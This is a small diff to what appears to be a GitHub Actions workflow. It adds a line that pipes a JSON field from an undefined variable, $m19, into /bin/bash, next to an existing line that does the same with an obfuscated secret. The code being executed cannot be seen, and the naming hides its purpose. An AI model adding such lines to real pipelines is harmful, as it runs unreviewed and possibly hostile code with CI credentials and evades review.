@@ -19,6 +19,7 @@ jobs:
           euol257: ${{ secrets.euol257 }}
         run: |
           printf '%s' "$euol257" | jq -r .i93 | /bin/bash
+          printf '%s' "$m19" | jq -r .wpg735 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
